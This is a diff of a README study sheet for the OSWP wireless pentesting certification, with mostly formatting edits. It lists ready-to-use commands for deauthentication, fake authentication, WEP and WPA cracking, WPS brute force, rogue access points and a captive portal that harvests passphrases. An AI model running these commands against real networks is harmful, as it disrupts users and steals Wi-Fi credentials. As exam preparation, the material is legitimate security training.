@@ -1,98 +1,128 @@
 # OSWP-Study_Sheet
 
-Study guide and command sheet for Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP)
+Study guide and command sheet for Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP)   TESTING THE PUSH
 
 ## Dependencies
+
 In order to run the following commands, install these frameworks first:
+
 ```bash
 sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
 ```
 
 ## Open Network with MAC filtering
+
 In the event that fake authentication persistently fails, it is plausible that MAC address filtering is being employed. Under such a scheme, the Access Point (AP) will only permit connections from a predefined list of MAC addresses. Should this be the scenario, it will be necessary to acquire a legitimate MAC address by monitoring network traffic with the aid of Airodump-ng. Subsequently, impersonation of this MAC address should be carried out once the corresponding client has disconnected from the network. It is imperative to refrain from initiating a fake authentication attack targeting a specific MAC address if the client remains active on the AP.
 
 ### Packet capture
+
 ```bash
 airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
 ```
+
 ### Get your MAC address
+
 ```bash
 macchanger --show <INTERFACE>
 ```
 
 ### Fake authentication attack
+
 ```bash
 aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
 ```
 
 ### ARP replay attack
+
 ```bash
 aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>
 ```
 
 ### Deauthentication attack
+
 ```bash
 aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
 ```
 
-### Crack 
+### Crack
+
 ```bash
 aircrack-ng <CAPTURE_NAME>
 ```
 
 ## WEP (Wired Equivalent Privacy)
+
 WEP is a severely flawed security algorithm for IEEE 802.11 wireless networks. Below are the steps to exploit WEP vulnerabilities:
 
-
 ### Step 1: Kill conflicting processes
+
 ```bash
 sudo airmon-ng check kill
 ```
+
 ### Step 2: Start monitor mode on wlan0
+
 ```bash
 sudo airmon-ng start wlan0
 ```
+
 ### Step 3: Scan for WEP networks
+
 ```bash
 sudo airodump-ng wlan0mon --encrypt WEP
 ```
+
 ### Step 4: Capture IVs
+
 ```bash
 besside-ng -c Channel -b BSSID wlan0mon
 ```
+
 ### Step 5: Crack WEP key
+
 ```bash
 aircrack-ng ./wep.cap
 ```
 
 ### Additional WEP Attacks:
+
 - [Hirte Attack](https://pentestlab.blog/2015/02/03/hirte-attack/)
 - [Caffe Latte Attck](https://www.computerworld.com/article/2539400/cafe-latte-attack-steals-data-from-wi-fi-users.html)
 
 ## WPS (Wi-Fi Protected Setup)
+
 WPS was originally known as Wi-Fi Simple Configuration, aiming to unify vendor technologies for secure WPA/WPA2 passphrase sharing. However, it has its set of vulnerabilities. Below are the steps to identify and exploit WPS vulnerabilities:
 
 ### Identifying access points with WPS enabled
+
 ```bash
 wash -i <INTERFACE> -s
 ```
+
 ### Fake authentication attack
+
 ```bash
 aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
 ```
+
 ### Offline brute force (pixie dust)
+
 ```bash
 reaver -i wlan0 -b BSSID -SNLAvv  -c 1 -K
 ```
-### Online brute force 
+
+### Online brute force
+
 ```bash
 reaver -i <INTERFACE> -b <BSSID> -SNLAsvv -d 1 -r 5:3 -c <CHANNEL_NUMBER>
 ```
 
 ## WPA/WPA2/WPA3 Testing
+
 Steps for testing security on networks with WPA/WPA2/WPA3 encryption, including setting up rogue APs and capturing handshakes:
 
 ## WPA2 Enterprise
+
 Follow these steps to set up wireless monitoring and perform the attack.
 
 ### Step 1: Activate monitoring mode
@@ -106,6 +136,7 @@ airmon-ng check kill && airmon-ng start <interface>
 ```bash
 airodump-ng <interface>
 ```
+
 *Note: The AUTH column will say MGT.*
 
 ### Step 3: Capture the handshake
@@ -125,10 +156,13 @@ aireplay-ng -0 0 -a ESSID -c client_ESSID interface
 After gathering the BSSID, ESSID, and channel:
 
 - Use Wireshark or tshark with filters:
+  
   ```bash
   wlan.bssid==E8:9C:12:02:66:AA && eap && tls.handshake.certificate
   ```
+  
   or
+  
   ```bash
   tls.handshake.type == 11,3
   ```
@@ -223,47 +257,63 @@ Use `wpa_supplicant` to connect:
 wpa_supplicant -c <config file>
 ```
 
-
 ## Rogue Access Points
+
 Instructions for creating a rogue AP.
 
 ### Discovery
+
 ```bash
 sudo airodump-ng -w capturename –output-format pcap wlan0mon
 ```
+
 **Wireshark Filters:**
+
 ```bash
 wlan.fc.type_subtype == 0x08 #Broadcast Frames
 wlan.ssid == “apname” #AP name
 ```
+
 Filters can be appended to filter for broadcast frames from a specific AP:
+
 ```bash
 wlan.fc.type_subtype == 0x08 && wlan.ssid == “apname”
 ```
+
 The interesting parts are in Tag: Vendor Specific: & Tag: RSN: Information
 
 ### Creating a Rogue AP
+
 Hostapd-mana template location:
+
 ```bash
 /etc/hostapd-mana/hostapd-mana.conf
 ```
+
 Or you may download the hostapd-mana.config in this repository and modify to your needs.
 
 Start hostapd-mana:
+
 ```bash
 sudo hostapd-mana hostapd-mana.conf
 ```
 
 ### Cracking .hccapx Files
+
 **aircrack:**
+
 ```bash
 aircrack-ng name.hccapx -w /wordlist/rockyou.txt
 ```
+
 If you run into errors, you may try:
+
 ```bash
 aircrack-ng name.hccapx -e ESSID -w /wordlist/rockyou.txt
 ```
+
 **hashcat:**
+
 ```
 hashcat -m 2500 capture.hccapx /usr/share/worlists/rockyou.txt
 ```
@@ -338,10 +388,10 @@ sudo mousepad /var/www/html/portal/login_check.php
 
 ### 9. Assign an IP address and activate the interface:
 
-  ```bash
-  sudo ip addr add 192.168.87.1/24 dev wlan0
-  sudo ip link set wlan0 up
-  ```
+```bash
+sudo ip addr add 192.168.87.1/24 dev wlan0
+sudo ip link set wlan0 up
+```
 
 ### 10. Ensure dnsmasq is installed:
 
@@ -446,8 +496,8 @@ sudo find /tmp/ -iname passphrase.txt
 sudo cat /tmp/systemd-private-b37…aef-apache2.service-b...i/tmp/passphrase.txt
 ```
 
-
 ## Information Discovery Example
+
 ```bash
 - ESSID of JesusIsTheWay
 - BSSID of 34:5a:90:e0:5a:30
@@ -457,23 +507,28 @@ sudo cat /tmp/systemd-private-b37…aef-apache2.service-b...i/tmp/passphrase.txt
 ```
 
 ## Definitions
+
 - AP: Access Point
 - BSSID: Basic Service Set Identifier is a 48-bit number that follows MAC address conventions.
 - ESSID: Extended Service Set Identifier is a unique identifier to avoid interference on a wireless network.
 
 ## Troubleshooting
+
 - Make sure that hostapd-mana is installed on Kali. Default installations currently feature hostapd, hostapd-wpa and hostapd_cli. None of these frameworks feature the *mana_wpaout* section in the *hostapd-mana.config*, and will result in error: *unknown configuration item 'mana_wpaout'*
 - When starting the exam, fist thing after connecting to the .ovpn is to test both **SSH** and **RDP** protocols to ensure connection works as intended.
 - In order to list wireless interfaces, execute command:
-```bash
-sudo airmon-ng
-```
+  
+  ```bash
+  sudo airmon-ng
+  ```
 - To restart Network Manager, execute command:
-```bash
-systemctl restart NetworkManager.service
-```  
+  
+  ```bash
+  systemctl restart NetworkManager.service
+  ```
 
 ## Sources
+
 - [LIODEUS OSWP Cheatsheet](https://liodeus.github.io/2020/10/29/OSWP-personal-cheatsheet.html)
 - [Hashcat File Formats](https://hashcat.net/wiki/doku.php?id=example_hashes)
 - [Hashcat Cracking WPA/WPA2](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
@@ -481,21 +536,26 @@ systemctl restart NetworkManager.service
 ## Disclaimer and Legal Notice
 
 ### Ethical Considerations and Legal Compliance
+
 The techniques, commands, and procedures outlined in this guide are intended solely for educational purposes and preparing for the Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP). These techniques involve methodologies that, if misused, may constitute illegal activities. Users are strongly cautioned against engaging in any unauthorized and/or unlawful actions.
 
 ### Scope of Use
+
 - **Authorized Environments Only**: The execution of penetration testing, network attacks, and other tactics described herein should only be performed on networks and systems that are explicitly owned or authorized for testing by the user. This includes personal hardware, controlled environments, or environments for which explicit, documented permission has been granted.
 - **No Unauthorized Use**: Under no circumstances should these techniques be applied to networks, systems, or devices without explicit authorization. Unauthorized use of these techniques may lead to legal consequences and is strongly condemned.
 
 ### Exam Conduct
+
 - **Adherence to Exam Guidelines**: While this guide serves as preparation material for the OSWP exam, users must strictly adhere to the guidelines, rules, and ethical standards set forth by Offensive Security during the examination.
 - **Prohibited Actions**: Any attempt to use these techniques outside of the specified exam environment, or in a manner not aligned with the exam's rules, may result in disqualification, legal action, and other serious consequences.
 
 ### Liability
+
 - **No Responsibility for Misuse**: The authors, contributors, and associated entities of this guide accept no responsibility or liability for any misuse, damage, or illegal activities arising from the information presented. Users are solely responsible for their actions.
 - **Acknowledgment of Risk**: Users acknowledge the risks involved in security testing and penetration testing and agree to ensure ethical and legal use of this information.
 
 ### Continuous Learning and Ethical Growth
+
 - **Commitment to Ethical Hacking**: Users are encouraged to pursue knowledge in cybersecurity and ethical hacking with a strong commitment to legal compliance, ethical behavior, and respect for privacy and data protection.
 
 By using the information in this guide, you acknowledge having read, understood, and agreed to this disclaimer and all its terms. Your use of this information indicates your acceptance of the risks and your commitment to using this knowledge responsibly and ethically.
